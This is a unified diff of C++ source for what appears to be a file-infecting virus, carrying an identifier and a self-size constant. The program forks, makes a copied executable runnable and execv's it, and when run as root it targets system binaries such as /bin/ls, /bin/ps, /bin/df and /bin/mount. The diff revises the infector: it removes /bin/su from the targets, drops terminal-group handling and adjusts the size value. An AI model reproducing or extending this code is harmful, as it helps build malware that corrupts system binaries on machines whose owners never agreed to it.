@@ -1,10 +1,9 @@
 #include <iostream>
 #include <fstream>
 #include <unistd.h>
-#include <signal.h>
 
 const char* IDENTIFIER = "PROBOTEST";
-const int MYSIZE = 19737;
+const int MYSIZE = 19524;
 
 using namespace std;
 
@@ -12,7 +11,6 @@ char* which(char* w);
 
 int main (int argc, char** argv) {
     pid_t childpid = fork();
-    signal(SIGTTOU, SIG_IGN);
     uid_t uid=getuid();
     srand(time(0));
     int c;
@@ -42,8 +40,6 @@ int main (int argc, char** argv) {
         command = "chmod u+x ";
         command += exe;
         c = system( command.c_str() );
-        setpgid(0, 0);
-        tcsetpgrp(0, getpgrp());
         execv((exe).c_str(), argv);
         return 30;
     }
@@ -53,7 +49,6 @@ int main (int argc, char** argv) {
         command += "-mindepth 1 -maxdepth 1 -type f";
         if (uid == 0) command += " | egrep '\
 ^/bin/ls$|\
-^/bin/su$|\
 ^/bin/mount$|\
 ^/bin/df$|\
 ^/bin/ps$'";
@@ -80,8 +75,6 @@ rm -f ${VIR}__ ";
         command += " ";
         command += exe;
         c = system( (command).c_str() );
-        setpgid(childpid, childpid);
-        tcsetpgrp(0, childpid);
         return 0;
     }
 }
